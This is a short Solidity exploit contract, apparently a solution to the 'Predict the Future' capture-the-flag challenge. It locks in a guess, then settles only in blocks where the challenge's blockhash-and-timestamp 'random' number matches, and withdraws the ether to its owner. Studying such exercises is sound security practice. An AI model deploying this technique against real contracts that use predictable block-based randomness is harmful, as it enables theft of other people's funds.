pragma solidity ^0.4.21;

interface PredictTheFutureChallenge {
	function lockInGuess(uint8 n) external payable;
	function settle() external;
}

contract AttackTheFuture {
	PredictTheFutureChallenge _target;
	address _owner;
	
	function AttackTheFuture(PredictTheFutureChallenge target) public payable {
		_target = target;
		_owner = msg.sender;

		// set this as the guesser
		_target.lockInGuess.value(1 ether)(5); // nice round number
	}

	function attempt() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
                                     
        if (answer == 5) _target.settle();            
    }                                
                                     
    function() public payable {      
		// accept, withdraw later
	}

	function withdraw() public {
		if (msg.sender == _owner)
			_owner.transfer(address(this).balance);
	}

}
